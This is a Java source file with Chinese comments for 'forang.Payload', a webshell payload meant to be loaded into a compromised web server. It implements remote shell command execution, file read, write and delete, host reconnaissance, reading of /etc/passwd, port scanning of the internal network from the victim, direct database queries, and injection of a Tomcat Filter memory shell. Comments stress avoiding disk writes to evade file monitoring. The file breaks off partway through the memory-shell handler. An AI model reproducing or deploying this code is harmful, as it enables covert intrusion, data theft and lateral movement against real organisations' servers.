package forang;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.InetSocketAddress;
import java.nio.channels.SelectionKey;
import java.nio.channels.Selector;
import java.nio.channels.SocketChannel;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.ResultSetMetaData;
import java.sql.Statement;
import java.util.ArrayList;
import java.util.Map;
import java.util.TreeMap;

/**
 * FORANG Java 动态载荷。
 *
 * <p>设计约束：
 * <ul>
 *   <li>只用 JDK 8 API —— 目标端从 JDK 6 到 21 都可能，编译时用 {@code --release 8}
 *       产出 52.0 字节码，覆盖绝大多数现网 Web 容器；</li>
 *   <li>不引用任何第三方库，整个类只有 JDK 自带依赖，defineClass 后可直接反射调用；</li>
 *   <li>入口只有一个静态方法 {@link #run(String, String[])}，返回文本，错误以
 *       {@code ERROR:} 开头，与平台既有 Parse 约定一致；</li>
 *   <li>进程输出用平台默认编码解码成 String（Windows 是 GBK、Linux 是 UTF-8），
 *       由调用方统一按 UTF-8 回写，避免中文在传输层二次损坏；</li>
 *   <li>回显格式必须和脚本载体一致：{@code list} 出 JSON 数组、{@code read} 出 base64、
 *       其余出 {@code OK}。前端文件面板按这套约定解析，两端不一致就会「目录解析失败」。</li>
 * </ul>
 *
 * <p>这里不落盘、不写临时文件：所有操作在内存里完成，减少被文件监控发现的机会
 * （文件写操作是用户显式要求的，自然除外）。
 */
public final class Payload implements java.lang.reflect.InvocationHandler {

    /** 存活探测标记，必须与 Go 侧 webshell.PongMarker 完全一致。 */
    private static final String PONG = "__WS_PONG__";

    /** 工作目录标记，必须与 Go 侧 webshell.CWDMarker 完全一致。 */
    private static final String CWD = "__WS_CWD__";

    /** 单次读文件上限，避免一次把内存撑爆（前端预览也用不到这么大）。 */
    private static final int MAX_READ = 8 * 1024 * 1024;

    /** 载体注入的 ServletContext；只有 JSP 上下文里才有，内存马操作依赖它。 */
    private static volatile Object sApp;

    /** 内存马触发条件（实例字段：一个 Filter 实例一套）。 */
    private String gateHeader;
    private String gateValue;
    private String cmdParam;

    /** 供内存马新建实例用（Proxy 的 InvocationHandler 必须是对象）。 */
    public Payload() {
    }

    /**
     * 载体每请求调用一次，把 request / application 交给载荷。
     * 直接用 Object 接收，避免在字节码里写死 javax 或 jakarta 类型。
     */
    public static void attach(Object request, Object app) {
        sApp = app;
    }

    /** 统一入口。op 为操作名，args 为参数，返回值直接回显。 */
    public static String run(String op, String[] args) {
        try {
            if ("exec".equals(op)) {
                return exec(args);
            }
            if ("info".equals(op)) {
                return info();
            }
            if ("ping".equals(op)) {
                return PONG;
            }
            if ("list".equals(op)) {
                return list(arg(args, 0));
            }
            if ("read".equals(op)) {
                return read(arg(args, 0));
            }
            if ("write".equals(op)) {
                // 第三个参数为 "b64" 时按 base64 解码写入，用于二进制上传
                boolean binary = "b64".equals(arg(args, 2));
                return write(arg(args, 0), arg(args, 1), binary);
            }
            if ("delete".equals(op)) {
                return delete(arg(args, 0));
            }
            if ("rename".equals(op)) {
                return rename(arg(args, 0), arg(args, 1));
            }
            if ("mkdir".equals(op)) {
                return mkdir(arg(args, 0));
            }
            if ("memshell_probe".equals(op)) {
                return msProbe();
            }
            if ("memshell_inject".equals(op)) {
                return msInject(arg(args, 0), arg(args, 1), arg(args, 2), arg(args, 3));
            }
            if ("memshell_list".equals(op)) {
                return msList();
            }
            if ("memshell_remove".equals(op)) {
                return msRemove(arg(args, 0));
            }
            if ("proc".equals(op)) {
                return proc(arg(args, 0), arg(args, 1));
            }
            if ("net".equals(op)) {
                return net(arg(args, 0), arg(args, 1), arg(args, 2));
            }
            if ("db".equals(op)) {
                return db(arg(args, 0), arg(args, 1), arg(args, 2), arg(args, 3),
                        arg(args, 4), arg(args, 5), arg(args, 6));
            }
            return "ERROR:unknown op: " + op;
        } catch (Throwable t) {
            String msg = t.getMessage();
            return "ERROR:" + t.getClass().getSimpleName() + (msg == null ? "" : ": " + msg);
        }
    }

    /** 命令执行：Windows 走 cmd /c，其余走 /bin/sh -c；stderr 合并进 stdout。 */
    private static String exec(String[] args) throws IOException, InterruptedException {
        if (args == null || args.length == 0 || args[0] == null || args[0].length() == 0) {
            return "ERROR:missing command";
        }
        String os = System.getProperty("os.name", "").toLowerCase();
        boolean win = os.indexOf("win") >= 0;
        String cmd = args[0];
        String dir = System.getProperty("user.dir", "");
        // 第二个参数可选：工作目录。用 cd 前缀而不是 ProcessBuilder.directory()——
        // 后者只影响子进程初始目录，命令里的相对路径语义不变，但目录不存在时会直接
        // 抛 IOException，拿不到「shell 报错」这种更有用的回显。
        if (args.length > 1 && args[1] != null && args[1].length() > 0) {
            cmd = (win ? "cd /d \"" : "cd \"") + args[1] + "\" && " + cmd;
            dir = args[1];
        }
        String[] argv = win
                ? new String[]{"cmd.exe", "/c", cmd}
                : new String[]{"/bin/sh", "-c", cmd};

        ProcessBuilder pb = new ProcessBuilder(argv);
        // 必须合并 stderr：否则错误流写满管道缓冲区会让进程卡死（大输出尤其明显）
        pb.redirectErrorStream(true);
        Process p = pb.start();
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        copy(p.getInputStream(), out);
        int code = p.waitFor();

        String text = new String(out.toByteArray());
        if (text.length() == 0 && code != 0) {
            return "ERROR:exit code " + code;
        }
        // 回带工作目录：平台按 CWDMarker 切分，前端命令面板据此更新当前路径
        return text + CWD + dir;
    }

    /** 目录列表，回显 JSON 数组，字段与脚本载体一致：name/size/is_dir/mtime。 */
    private static String list(String path) {
        File dir = new File(path == null || path.length() == 0
                ? System.getProperty("user.dir", ".") : path);
        if (!dir.exists()) {
            return "ERROR:路径不存在: " + dir.getPath();
        }
        File[] files = dir.listFiles();
        if (files == null) {
            return "ERROR:无法列出目录（权限不足或不是目录）: " + dir.getPath();
        }
        // 不排序：排序需要 Comparator，匿名内部类会多编出一个 forang/Payload$1.class，
        // 而载体只 defineClass 主类，目标端会 NoClassDefFoundError。前端本来就按
        // is_dir + name 排，这里保持原始顺序即可。
        StringBuilder sb = new StringBuilder("[");
        for (int i = 0; i < files.length; i++) {
            File f = files[i];
            if (i > 0) {
                sb.append(',');
            }
            sb.append("{\"name\":").append(json(f.getName()))
                    .append(",\"size\":").append(f.length())
                    .append(",\"is_dir\":").append(f.isDirectory())
                    .append(",\"mtime\":").append(f.lastModified() / 1000)
                    .append('}');
        }
        return sb.append(']').toString();
    }

    /** 读文件，回显 base64（与脚本载体一致，二进制也安全）。 */
    private static String read(String path) throws IOException {
        if (path == null || path.length() == 0) {
            return "ERROR:缺少路径";
        }
        File f = new File(path);
        if (!f.exists() || !f.isFile()) {
            return "ERROR:文件不存在: " + path;
        }
        if (!f.canRead()) {
            return "ERROR:无读取权限: " + path;
        }
        if (f.length() > MAX_READ) {
            return "ERROR:文件过大（" + f.length() + " 字节，上限 " + MAX_READ + "），请用命令执行分块导出";
        }
        ByteArrayOutputStream out = new ByteArrayOutputStream((int) Math.max(64, f.length()));
        FileInputStream in = new FileInputStream(f);
        try {
            copy(in, out);
        } finally {
            in.close();
        }
        return b64(out.toByteArray());
    }

    /** 写文件：binary=true 时按 base64 解码后写入，否则按文本 UTF-8 写入。 */
    private static String write(String path, String content, boolean binary) throws IOException {
        if (path == null || path.length() == 0) {
            return "ERROR:缺少路径";
        }
        File f = new File(path);
        File parent = f.getParentFile();
        if (parent != null && !parent.exists() && !parent.mkdirs()) {
            return "ERROR:无法创建父目录: " + parent.getPath();
        }
        byte[] data = content == null
                ? new byte[0]
                : (binary ? unb64(content) : content.getBytes("UTF-8"));
        FileOutputStream out = new FileOutputStream(f);
        try {
            out.write(data);
        } finally {
            out.close();
        }
        return "OK";
    }

    private static String delete(String path) {
        if (path == null || path.length() == 0) {
            return "ERROR:缺少路径";
        }
        File f = new File(path);
        if (!f.exists()) {
            return "ERROR:路径不存在: " + path;
        }
        if (!deleteRec(f)) {
            return "ERROR:删除失败（权限不足或目录非空）: " + path;
        }
        return "OK";
    }

    private static boolean deleteRec(File f) {
        if (f.isDirectory()) {
            File[] kids = f.listFiles();
            if (kids != null) {
                for (File k : kids) {
                    if (!deleteRec(k)) {
                        return false;
                    }
                }
            }
        }
        return f.delete();
    }

    private static String rename(String from, String to) {
        if (from == null || from.length() == 0 || to == null || to.length() == 0) {
            return "ERROR:缺少源路径或目标路径";
        }
        File a = new File(from);
        if (!a.exists()) {
            return "ERROR:源路径不存在: " + from;
        }
        File b = new File(to);
        if (b.exists()) {
            return "ERROR:目标已存在: " + to;
        }
        if (!a.renameTo(b)) {
            return "ERROR:重命名失败（跨分区或权限不足）";
        }
        return "OK";
    }

    private static String mkdir(String path) {
        if (path == null || path.length() == 0) {
            return "ERROR:缺少路径";
        }
        File f = new File(path);
        if (f.exists()) {
            return "ERROR:路径已存在: " + path;
        }
        if (!f.mkdirs()) {
            return "ERROR:创建目录失败（权限不足）";
        }
        return "OK";
    }

    /** 目标环境信息，用于连接后快速判断可用手法。 */
    private static String info() {
        Map<String, String> kv = new TreeMap<String, String>();
        kv.put("os.name", System.getProperty("os.name", ""));
        kv.put("os.version", System.getProperty("os.version", ""));
        kv.put("os.arch", System.getProperty("os.arch", ""));
        kv.put("java.version", System.getProperty("java.version", ""));
        kv.put("java.vendor", System.getProperty("java.vendor", ""));
        kv.put("user.name", System.getProperty("user.name", ""));
        kv.put("user.dir", System.getProperty("user.dir", ""));
        kv.put("user.home", System.getProperty("user.home", ""));
        kv.put("file.encoding", System.getProperty("file.encoding", ""));
        kv.put("java.io.tmpdir", System.getProperty("java.io.tmpdir", ""));
        kv.put("classpath", System.getProperty("java.class.path", ""));
        kv.put("hostname", hostname());
        // 以下三项决定「能不能更进一步」：内存马要 attach 能力、提权要看运行账号
        kv.put("available.processors", String.valueOf(Runtime.getRuntime().availableProcessors()));
        kv.put("max.memory.mb", String.valueOf(Runtime.getRuntime().maxMemory() / 1048576L));
        kv.put("cwd.writable", String.valueOf(new File(System.getProperty("user.dir", ".")).canWrite()));

        StringBuilder sb = new StringBuilder();
        for (Map.Entry<String, String> e : kv.entrySet()) {
            sb.append(e.getKey()).append('=').append(e.getValue()).append('\n');
        }
        return sb.toString();
    }

    /** 不依赖 InetAddress 的 hostname 兜底（部分容器禁用了网络栈）。 */
    private static String hostname() {
        try {
            return java.net.InetAddress.getLocalHost().getHostName();
        } catch (Throwable ignored) {
            return System.getenv("COMPUTERNAME") != null
                    ? System.getenv("COMPUTERNAME")
                    : String.valueOf(System.getenv("HOSTNAME"));
        }
    }

    private static String arg(String[] args, int i) {
        return args != null && args.length > i ? args[i] : null;
    }

    // ---------- 进程 / 网络 / 数据库（Java 载体插件） ----------
    //
    // 脚本载体的这三个插件是「把 PHP/JS 源码丢给目标端解释器跑」；Java 载体只有字节码，
    // 必须在 JDK 自带 API 上等价重写。硬约束没变：零第三方依赖、零额外 class——
    // 任何匿名类/内部类都会多产出 Payload$N.class，而载体只 defineClass 主类。
    // 回显格式与脚本插件对齐（procs / open / columns+rows），前端面板才能一套通用。

    /** 进程列表：Linux 读 /proc（不依赖目标装没装 ps），Windows 走 tasklist。 */
    private static String proc(String mode, String filter) throws IOException, InterruptedException {
        boolean win = System.getProperty("os.name", "").toLowerCase().indexOf("win") >= 0;
        // 外层结构与脚本插件一致：{"os":"linux","procs":[...]}，前端面板才不用分载体写两套
        StringBuilder sb = new StringBuilder("{\"os\":").append(json(win ? "win" : "linux"))
                .append(",\"procs\":[");
        // 上限只在「没给过滤词」时生效：带过滤词说明是在具体找进程（比如定位 tomcat 的
        // pid），此时必须扫完全部条目——按 /proc 的枚举顺序，目标进程很可能排在 500 名开外，
        // 早期固定 500 条上限会出现「进程明明在跑却搜不到」的假阴性。
        boolean filtered = filter != null && filter.trim().length() > 0;
        int cap = filtered ? 1000 : 500;
        int n = 0;
        if (win) {
            String out = execText("tasklist /fo csv /nh");
            String[] lines = out.split("\n");
            for (int i = 0; i < lines.length && n < cap; i++) {
                String line = lines[i].trim();
                if (line.length() == 0) {
                    continue;
                }
                // "chrome.exe","1234","Console","1","123,456 K"
                String[] f = line.split("\",\"");
                if (f.length < 2) {
                    continue;
                }
                String name = f[0].replace("\"", "");
                String pid = f[1].replace("\"", "");
                String mem = f.length > 4 ? f[4].replace("\"", "") : "";
                if (!hit(pid, name, filter)) {
                    continue;
                }
                if (n++ > 0) {
                    sb.append(',');
                }
                sb.append("{\"pid\":").append(num(pid)).append(",\"name\":").append(json(name))
                        .append(",\"user\":\"\",\"state\":\"running\",\"mem\":").append(json(mem)).append('}');
            }
        } else {
            String[] entries = new File("/proc").list();
            Map<String, String> users = passwd();
            for (int i = 0; entries != null && i < entries.length && n < cap; i++) {
                String d = entries[i];
                if (!digits(d)) {
                    continue;
                }
                String cmdline = readText(new File("/proc/" + d + "/cmdline"), 8192).replace('\0', ' ').trim();
                String status = readText(new File("/proc/" + d + "/status"), 8192);
                String name = statusField(status, "Name:");
                String uid = statusField(status, "Uid:");
                String cmd = cmdline.length() > 0 ? cmdline : "[" + name + "]";
                if (!hit(d, cmd + " " + name, filter)) {
                    continue;
                }
                String who = users.get(uid);
                if (n++ > 0) {
                    sb.append(',');
                }
                sb.append("{\"pid\":").append(num(d)).append(",\"name\":").append(json(name))
                        .append(",\"user\":").append(json(who == null ? uid : who))
                        .append(",\"state\":").append(json(statusField(status, "State:")))
                        .append(",\"cmd\":").append(json(clip(cmd, 400))).append('}');
            }
        }
        return sb.append("]}").toString();
    }

    /**
     * 网络：mode=list 列本机 TCP 连接（Linux 读 /proc/net/tcp，Windows 走 netstat -ano）；
     * mode=scan 从目标侧发起 connect 扫描，是这批插件里最实用的内网入口。
     */
    private static String net(String mode, String host, String ports) throws Exception {
        if ("scan".equals(mode)) {
            return netScan(host, ports);
        }
        boolean win = System.getProperty("os.name", "").toLowerCase().indexOf("win") >= 0;
        StringBuilder sb = new StringBuilder("[");
        int n = 0;
        if (win) {
            String[] lines = execText("netstat -ano").split("\n");
            for (int i = 0; i < lines.length && n < 800; i++) {
                String[] f = splitWS(lines[i]);
                if (f.length < 5 || !"TCP".equalsIgnoreCase(f[0])) {
                    continue;
                }
                if (n++ > 0) {
                    sb.append(',');
                }
                sb.append("{\"proto\":\"tcp\",\"local\":").append(json(f[1]))
                        .append(",\"remote\":").append(json(f[2]))
                        .append(",\"state\":").append(json(f[3]))
                        .append(",\"uid\":\"\",\"pid\":").append(num(f[4])).append('}');
            }
        } else {
            String[] files = new String[]{"/proc/net/tcp", "/proc/net/tcp6"};
            for (int k = 0; k < files.length; k++) {
                String body = readText(new File(files[k]), 512 * 1024);
                if (body.length() == 0) {
                    continue;
                }
                String[] lines = body.split("\n");
                for (int i = 1; i < lines.length && n < 800; i++) {
                    String[] f = splitWS(lines[i]);
                    if (f.length < 10) {
                        continue;
                    }
                    if (n++ > 0) {
                        sb.append(',');
                    }
                    sb.append("{\"proto\":\"tcp\",\"local\":").append(json(hexAddr(f[1])))
                            .append(",\"remote\":").append(json(hexAddr(f[2])))
                            .append(",\"state\":").append(json(stateName(f[3])))
                            .append(",\"uid\":").append(json(f[7]))
                            .append(",\"inode\":").append(json(f[9])).append('}');
                }
            }
        }
        return sb.append(']').toString();
    }

    /**
     * connect 扫描：非阻塞 SocketChannel + Selector，一次挂上几百个目标再统一收口。
     * 不用线程池是因为任务体必须是类（Runnable 实现类会多产 class 文件），
     * NIO 这套纯 JDK 自带，且不占线程。
     */
    private static String netScan(String host, String ports) throws IOException {
        ArrayList<Integer> want = new ArrayList<Integer>();
        String[] items = ports == null ? new String[0] : ports.split(",");
        for (int i = 0; i < items.length && want.size() < 300; i++) {
            String s = items[i].trim();
            int dash = s.indexOf('-');
            try {
                if (dash > 0) {
                    int lo = Integer.parseInt(s.substring(0, dash).trim());
                    int hi = Integer.parseInt(s.substring(dash + 1).trim());
                    for (int p = lo; p <= hi && p <= 65535 && want.size() < 300; p++) {
                        want.add(Integer.valueOf(p));
                    }
                } else if (s.length() > 0) {
                    int p = Integer.parseInt(s);
                    if (p > 0 && p <= 65535) {
                        want.add(Integer.valueOf(p));
                    }
                }
            } catch (Throwable ignored) {
                // 单个端口写错就跳过，不整体失败
            }
        }
        StringBuilder sb = new StringBuilder("{\"host\":").append(json(host)).append(",\"open\":[");
        Selector sel = Selector.open();
        ArrayList<SocketChannel> chans = new ArrayList<SocketChannel>();
        ArrayList<Integer> open = new ArrayList<Integer>();
        long deadline = System.currentTimeMillis() + 8000L;
        try {
            for (int i = 0; i < want.size(); i++) {
                SocketChannel sc = null;
                try {
                    sc = SocketChannel.open();
                    sc.configureBlocking(false);
                    sc.connect(new InetSocketAddress(host, want.get(i).intValue()));
                    sc.register(sel, SelectionKey.OP_CONNECT, want.get(i));
                    chans.add(sc);
                } catch (Throwable t) {
                    if (sc != null) {
                        try {
                            sc.close();
                        } catch (Throwable ignored) {
                            // 关不掉也无所谓，进程退出会回收
                        }
                    }
                }
            }
            int remaining = chans.size();
            while (remaining > 0) {
                long left = deadline - System.currentTimeMillis();
                if (left <= 0) {
                    break;
                }
                sel.select(left > 300 ? 300 : left);
                java.util.Iterator<SelectionKey> it = sel.selectedKeys().iterator();
                while (it.hasNext()) {
                    SelectionKey k = it.next();
                    it.remove();
                    remaining--;
                    try {
                        SocketChannel sc = (SocketChannel) k.channel();
                        if (sc.finishConnect()) {
                            open.add((Integer) k.attachment());
                        }
                    } catch (Throwable ignored) {
                        // 连接被拒/超时：不是开放端口
                    }
                    k.cancel();
                    try {
                        k.channel().close();
                    } catch (Throwable ignored) {
                        // 同上
                    }
                }
            }
        } finally {
            try {
                sel.close();
            } catch (Throwable ignored) {
                // 同上
            }
            for (int i = 0; i < chans.size(); i++) {
                try {
                    chans.get(i).close();
                } catch (Throwable ignored) {
                    // 同上
                }
            }
        }
        java.util.Collections.sort(open);
        for (int i = 0; i < open.size(); i++) {
            if (i > 0) {
                sb.append(',');
            }
            sb.append(open.get(i));
        }
        return sb.append("]}").toString();
    }

    /**
     * 数据库：JDBC 直连 + 执行 SQL，输出与脚本插件同构的 {ok,columns,rows,affected}。
     * 与脚本载体的关键差别——驱动必须已经在目标 classpath 上（脚本载体是把驱动塞进 payload，
     * Java 载体做不到），所以驱动缺失时直接回 ERROR 并给出可操作的建议。
     */
    private static String db(String type, String host, String port, String user, String pass,
            String dbname, String sql) {
        if (type == null || type.length() == 0) {
            type = "mysql";
        }
        if ("drivers".equals(type) || "probe".equals(type)) {
            return dbDrivers();
        }
        String[] drivers = driversFor(type);
        String loaded = null;
        StringBuilder tried = new StringBuilder();
        for (int i = 0; i < drivers.length; i++) {
            try {
                Class.forName(drivers[i]);
                loaded = drivers[i];
                break;
            } catch (Throwable t) {
                if (tried.length() > 0) {
                    tried.append(',');
                }
                tried.append(drivers[i]);
            }
        }
        if (loaded == null) {
            return "ERROR:目标 classpath 上没有 " + type + " 的 JDBC 驱动（试过 " + tried
                    + "）。脚本载体能连是因为驱动被塞进了 payload；Java 载体只能用目标已有的 jar——"
                    + "可先用 jar_load 往容器加载驱动，或退回 exec 调数据库客户端。";
        }
        Connection conn = null;
        Statement st = null;
        ResultSet rs = null;
        long t0 = System.currentTimeMillis();
        try {
            try {
                DriverManager.setLoginTimeout(10);
            } catch (Throwable ignored) {
                // 老驱动不实现，无碍
            }
            conn = DriverManager.getConnection(jdbcURL(type, host, port, dbname),
                    user == null ? "" : user, pass == null ? "" : pass);
            st = conn.createStatement();
            try {
                st.setQueryTimeout(30);
            } catch (Throwable ignored) {
                // 同上
            }
            StringBuilder sb = new StringBuilder("{\"ok\":true");
            boolean has = st.execute(sql);
            if (has) {
                rs = st.getResultSet();
                ResultSetMetaData md = rs.getMetaData();
                int cols = md.getColumnCount();
                String[] names = new String[cols + 1];
                sb.append(",\"columns\":[");
                for (int i = 1; i <= cols; i++) {
                    names[i] = md.getColumnLabel(i);
                    if (names[i] == null || names[i].length() == 0) {
                        names[i] = md.getColumnName(i);
                    }
                    if (i > 1) {
                        sb.append(',');
                    }
                    sb.append(json(names[i]));
                }
                sb.append("],\"rows\":[");
                int rows = 0;
                while (rs.next() && rows < 300) {
                    if (rows++ > 0) {
                        sb.append(',');
                    }
                    sb.append('{');
                    for (int i = 1; i <= cols; i++) {
                        if (i > 1) {
                            sb.append(',');
                        }
                        sb.append(json(names[i])).append(':');
                        String v = clip(rs.getString(i), 500);
                        // null 原样输出为 JSON null：前端表格里能看出「这格是 NULL」
                        if (v == null) {
                            sb.append("null");
                        } else {
                            sb.append(json(v));
                        }
                    }
                    sb.append('}');
                }
                sb.append("],\"affected\":").append(rows);
            } else {
                sb.append(",\"columns\":[],\"rows\":[],\"affected\":").append(st.getUpdateCount());
            }
            sb.append(",\"driver\":").append(json(loaded))
                    .append(",\"elapsed_ms\":").append(System.currentTimeMillis() - t0).append('}');
            return sb.toString();
        } catch (Throwable t) {
            String msg = t.getMessage();
            return "ERROR:db:" + t.getClass().getSimpleName() + (msg == null ? "" : ": " + msg);
        } finally {
            if (rs != null) {
                try {
                    rs.close();
                } catch (Throwable ignored) {
                    // 关闭失败不影响结果
                }
            }
            if (st != null) {
                try {
                    st.close();
                } catch (Throwable ignored) {
                    // 同上
                }
            }
            if (conn != null) {
                try {
                    conn.close();
                } catch (Throwable ignored) {
                    // 同上
                }
            }
        }
    }

    /** 探测目标 classpath 上到底有哪些 JDBC 驱动，决定「能不能直连」而不是靠猜。 */
    private static String dbDrivers() {
        String[] types = new String[]{"mysql", "pgsql", "sqlite", "sqlserver", "oracle"};
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < types.length; i++) {
            String[] ds = driversFor(types[i]);
            for (int j = 0; j < ds.length; j++) {
                boolean ok;
                try {
                    Class.forName(ds[j]);
                    ok = true;
                } catch (Throwable t) {
                    ok = false;
                }
                if (ok) {
                    sb.append(types[i]).append(" -> ").append(ds[j]).append('\n');
                    break;
                }
            }
        }
        if (sb.length() == 0) {
            sb.append("未发现任何 JDBC 驱动（mysql/pgsql/sqlite/sqlserver/oracle 全部缺失）\n");
        }
        String cp = System.getProperty("java.class.path", "");
        sb.append("classpath=").append(clip(cp, 300));
        return sb.toString();
    }

    private static String[] driversFor(String type) {
        if ("pgsql".equals(type) || "postgresql".equals(type) || "postgres".equals(type)) {
            return new String[]{"org.postgresql.Driver"};
        }
        if ("sqlite".equals(type) || "sqlite3".equals(type)) {
            return new String[]{"org.sqlite.JDBC"};
        }
        if ("sqlserver".equals(type) || "mssql".equals(type)) {
            return new String[]{"com.microsoft.sqlserver.jdbc.SQLServerDriver"};
        }
        if ("oracle".equals(type) || "ora".equals(type)) {
            return new String[]{"oracle.jdbc.OracleDriver", "oracle.jdbc.driver.OracleDriver"};
        }
        return new String[]{"com.mysql.cj.jdbc.Driver", "com.mysql.jdbc.Driver", "org.mariadb.jdbc.Driver"};
    }

    private static String jdbcURL(String type, String host, String port, String dbname) {
        String h = host == null || host.length() == 0 ? "127.0.0.1" : host;
        String p = port == null ? "" : port.trim();
        String d = dbname == null ? "" : dbname;
        if ("sqlite".equals(type) || "sqlite3".equals(type)) {
            return "jdbc:sqlite:" + d;
        }
        if ("pgsql".equals(type) || "postgresql".equals(type) || "postgres".equals(type)) {
            return "jdbc:postgresql://" + h + ":" + (p.length() == 0 ? "5432" : p) + "/" + d;
        }
        if ("sqlserver".equals(type) || "mssql".equals(type)) {
            return "jdbc:sqlserver://" + h + (p.length() == 0 ? "" : ":" + p) + ";databaseName=" + d;
        }
        if ("oracle".equals(type) || "ora".equals(type)) {
            return "jdbc:oracle:thin:@" + h + ":" + (p.length() == 0 ? "1521" : p) + ":" + d;
        }
        // MySQL 默认带超时参数：目标到库这段网络经常是半通，没有超时会一直挂着
        return "jdbc:mysql://" + h + ":" + (p.length() == 0 ? "3306" : p) + "/" + d
                + "?useUnicode=true&characterEncoding=utf8&connectTimeout=8000&socketTimeout=20000";
    }

    /** /proc/net/tcp 的地址是小端 hex：0100007F:1F90 → 127.0.0.1:8080。 */
    private static String hexAddr(String s) {
        if (s == null) {
            return "";
        }
        int c = s.indexOf(':');
        if (c < 0) {
            return s;
        }
        String a = s.substring(0, c);
        int port = 0;
        try {
            port = Integer.parseInt(s.substring(c + 1), 16);
        } catch (Throwable ignored) {
            // 端口解析失败就是 0
        }
        String ip;
        if (a.length() == 8) {
            ip = ipv4(a);
        } else if (a.length() == 32) {
            if (a.startsWith("0000000000000000FFFF0000")) {
                ip = "::ffff:" + ipv4(a.substring(24));
            } else {
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i < 32; i += 8) {
                    if (i > 0) {
                        sb.append(':');
                    }
                    String w = a.substring(i, i + 8);
                    sb.append(w.substring(6, 8)).append(w.substring(4, 6))
                            .append(w.substring(2, 4)).append(w.substring(0, 2));
                }
                ip = sb.toString();
            }
        } else {
            ip = a;
        }
        return ip + ":" + port;
    }

    private static String ipv4(String leHex) {
        long v;
        try {
            v = Long.parseLong(leHex, 16);
        } catch (Throwable t) {
            return leHex;
        }
        // 小端读：最低字节是第一段，0100007F → 127.0.0.1
        return (v & 0xff) + "." + ((v >> 8) & 0xff) + "."
                + ((v >> 16) & 0xff) + "." + ((v >> 24) & 0xff);
    }

    // ---------- 插件用的低层工具（不依赖外部命令） ----------

    private static boolean isWS(char c) {
        return c == ' ' || c == '\t' || c == '\n' || c == '\r';
    }

    /** 按空白切分（不用正则：正则对象在受限容器里更容易被安全管理器拦）。 */
    private static String[] splitWS(String line) {
        ArrayList<String> out = new ArrayList<String>();
        int i = 0;
        int n = line.length();
        while (i < n) {
            while (i < n && isWS(line.charAt(i))) {
                i++;
            }
            int s = i;
            while (i < n && !isWS(line.charAt(i))) {
                i++;
            }
            if (i > s) {
                out.add(line.substring(s, i));
            }
        }
        return out.toArray(new String[out.size()]);
    }

    /** /proc/net/tcp 的状态码 → 名字，比给用户看 0A 友好。 */
    private static String stateName(String code) {
        if ("01".equals(code)) {
            return "ESTABLISHED";
        }
        if ("02".equals(code)) {
            return "SYN_SENT";
        }
        if ("03".equals(code)) {
            return "SYN_RECV";
        }
        if ("04".equals(code)) {
            return "FIN_WAIT1";
        }
        if ("05".equals(code)) {
            return "FIN_WAIT2";
        }
        if ("06".equals(code)) {
            return "TIME_WAIT";
        }
        if ("07".equals(code)) {
            return "CLOSE";
        }
        if ("08".equals(code)) {
            return "CLOSE_WAIT";
        }
        if ("09".equals(code)) {
            return "LAST_ACK";
        }
        if ("0A".equals(code)) {
            return "LISTEN";
        }
        if ("0B".equals(code)) {
            return "CLOSING";
        }
        return code == null ? "" : code;
    }

    /** 读小文件转文本，失败一律回空串（/proc 里进程随时可能消失）。 */
    private static String readText(File f, int max) {
        InputStream in = null;
        try {
            in = new FileInputStream(f);
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            byte[] buf = new byte[4096];
            int n;
            while ((n = in.read(buf)) > 0 && out.size() < max) {
                out.write(buf, 0, n);
            }
            return new String(out.toByteArray());
        } catch (Throwable t) {
            return "";
        } finally {
            if (in != null) {
                try {
                    in.close();
                } catch (Throwable ignored) {
                    // 读 /proc 的关闭失败无需处理
                }
            }
        }
    }

    /** 取 /proc/<pid>/status 里某个键的第一个值（"Uid:" 取真实 uid，忽略 euid/suid）。 */
    private static String statusField(String status, String key) {
        if (status == null || status.length() == 0) {
            return "";
        }
        String[] lines = status.split("\n");
        for (int i = 0; i < lines.length; i++) {
            String l = lines[i];
            if (l.startsWith(key)) {
                String[] f = splitWS(l);
                return f.length > 1 ? f[1] : "";
            }
        }
        return "";
    }

    /** uid → 用户名，省得让人对着 0 猜。 */
    private static Map<String, String> passwd() {
        Map<String, String> m = new TreeMap<String, String>();
        String body = readText(new File("/etc/passwd"), 256 * 1024);
        if (body.length() == 0) {
            return m;
        }
        String[] lines = body.split("\n");
        for (int i = 0; i < lines.length; i++) {
            String[] f = lines[i].split(":");
            if (f.length >= 3) {
                m.put(f[2].trim(), f[0]);
            }
        }
        return m;
    }

    private static boolean digits(String s) {
        if (s == null || s.length() == 0) {
            return false;
        }
        for (int i = 0; i < s.length(); i++) {
            if (s.charAt(i) < '0' || s.charAt(i) > '9') {
                return false;
            }
        }
        return true;
    }

    private static long num(String s) {
        try {
            return Long.parseLong(s.trim());
        } catch (Throwable t) {
            return 0L;
        }
    }

    /** 过滤条件：纯数字按 PID 精确匹配，其余按命令行/进程名模糊匹配；空条件全留。 */
    private static boolean hit(String pid, String text, String filter) {
        if (filter == null) {
            return true;
        }
        String f = filter.trim().toLowerCase();
        if (f.length() == 0) {
            return true;
        }
        if (digits(f)) {
            // 数字只当 PID 用：否则「0」会把命令行里带 0 的进程全捞出来
            return pid != null && pid.equals(f);
        }
        return text != null && text.toLowerCase().indexOf(f) >= 0;
    }

    private static String clip(String s, int max) {
        if (s == null) {
            return null;
        }
        return s.length() <= max ? s : s.substring(0, max) + "...";
    }

    // ---------- 内存马（Tomcat Filter） ----------
    //
    // 做法：用 java.lang.reflect.Proxy 给容器自己的 Filter 接口生成实现，
    // InvocationHandler 就是本类实例。这样不需要额外 class：
    //   * 不依赖 Nashorn（JDK15 已移除），也不依赖任何编译期 servlet API；
    //   * jakarta / javax 两套接口按 Class.forName 自动选，Tomcat 8/9/10 通用；
    //   * 触发条件走请求头 + 参数，不带门禁的流量照常放行，不容易误伤业务。
    public Object invoke(Object proxy, java.lang.reflect.Method m, Object[] a) throws Throwable {
        String n = m.getName();
        if ("toString".equals(n)) {
            return "forang-filter";
        }
        if ("hashCode".equals(n)) {
            return Integer.valueOf(System.identityHashCode(proxy));
        }
        if ("equals".equals(n)) {
            return Boolean.valueOf(proxy == a[0]);
        }
        if (!"doFilter".equals(n)) {
            return null;
        }
        Object req = a[0];
        Object res = a[1];
        Object chain = a[2];
